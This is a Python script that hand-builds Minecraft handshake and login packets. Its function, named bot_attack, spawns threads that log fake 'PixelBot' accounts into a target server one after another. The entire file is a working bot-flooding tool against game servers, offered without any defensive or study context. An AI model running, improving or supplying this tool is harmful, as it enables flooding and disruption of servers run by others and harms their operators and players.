import socket
import struct
import random
import threading
import time

def encode_varint(value):
    result = b''
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            result += struct.pack('B', byte | 0x80)
        else:
            result += struct.pack('B', byte)
            break
    return result

def pack_string(string):
    encoded = string.encode('utf-8')
    return encode_varint(len(encoded)) + encoded

def send_packet(sock, packet_id, data):
    packet = encode_varint(packet_id) + data
    sock.send(encode_varint(len(packet)) + packet)

def join_bot(host, port, username, output_box=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))

        handshake = (
            encode_varint(760) +
            pack_string(host) +
            struct.pack('>H', port) +
            encode_varint(2)
        )
        send_packet(sock, 0x00, handshake)

        login_start = pack_string(username)
        send_packet(sock, 0x00, login_start)

        msg = f"[✓] Joined as {username}"
        if output_box:
            output_box.configure(state="normal")
            output_box.insert("end", msg + "\n")
            output_box.see("end")
            output_box.configure(state="disabled")
        else:
            print(msg)

        time.sleep(5)
        sock.close()
    except Exception as e:
        msg = f"[!] Failed to join {username}: {e}"
        if output_box:
            output_box.configure(state="normal")
            output_box.insert("end", msg + "\n")
            output_box.see("end")
            output_box.configure(state="disabled")
        else:
            print(msg)

def bot_attack(host, output_box, app, port=25565, count=20, delay=2):
    def run():
        for i in range(count):
            username = "PixelBot" + str(random.randint(1000, 9999))
            threading.Thread(target=join_bot, args=(host, port, username, output_box)).start()
            time.sleep(delay)
    threading.Thread(target=run).start()
